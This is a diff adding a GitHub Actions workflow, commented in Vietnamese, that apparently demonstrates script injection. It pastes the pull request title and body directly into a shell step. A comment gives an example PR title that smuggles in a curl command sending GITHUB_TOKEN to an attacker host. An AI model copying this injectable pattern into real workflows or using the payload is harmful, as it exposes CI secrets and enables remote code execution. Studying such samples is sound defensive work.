@@ -1,0 +1,19 @@
+# LỖ HỔNG NGHIÊM TRỌNG (SECURITY RISK): GitHub Actions Script Injection (Thực thi mã từ xa - RCE)
+# Kẻ tấn công chỉ cần mở một Pull Request có tiêu đề:
+#   feat: fix typo"; curl -s https://attacker.example.invalid/steal?t=$GITHUB_TOKEN #
+# Trình xử lý biểu thức ${{ ... }} sẽ dán thẳng chuỗi độc hại đó vào kịch bản Bash TRƯỚC KHI Bash thực thi!
+name: Vulnerable PR Title Greeter
+
+on:
+  pull_request:
+    types: [opened, edited]
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: In tiêu đề Pull Request (DỄ BỊ TẤN CÔNG INJECTION!)
+        # NGUY HIỂM: Nối trực tiếp dữ liệu do người dùng ngoài kiểm soát vào khối lệnh shell `run:`
+        run: |
+          echo "Đang kiểm tra PR: ${{ github.event.pull_request.title }}"
+          echo "Mô tả chi tiết: ${{ github.event.pull_request.body }}"
